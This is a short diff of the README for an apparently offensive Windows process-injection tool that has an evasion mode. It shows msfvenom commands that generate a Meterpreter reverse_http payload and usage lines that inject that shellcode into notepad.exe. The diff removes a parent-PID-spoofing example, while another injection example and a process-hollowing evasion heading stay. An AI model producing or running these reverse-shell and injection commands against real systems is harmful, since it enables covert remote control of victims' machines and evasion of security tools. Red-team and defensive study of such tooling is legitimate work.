@@ -45,12 +45,6 @@ Currently the tool support 1 evade technique.
 	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
 	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:3
 	
-	Parent PID Spoofing
-	Generating shellcode in c format and injecting it in the target process.
-	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
-	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /parentproc:explorer /f:c /t:4
-	
-
 	Evade Technique
 
 	Parent PID Spoofing with Process Hollowing.
